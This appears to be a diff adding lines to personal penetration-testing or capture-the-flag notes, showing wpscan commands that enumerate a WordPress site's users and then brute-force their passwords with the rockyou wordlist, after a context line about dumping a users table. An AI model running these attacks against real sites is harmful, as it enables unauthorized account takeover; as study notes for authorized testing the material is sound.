@@ -165,3 +165,6 @@ This tells the client to connect to the local database using a username of USERN
 - Let’s dump the users table. To do this we use the SQL command: **SELECT * FROM users;.**
  
  ### Wpscan
+ - wpscan --url http://xxxxx -e
+ - get users and add them to user.txt to make a distionary of users to bruteforce
+ - wpscan --url http://xxxx -P /usr/share/wordlists/rockyou.txt -U user.txt
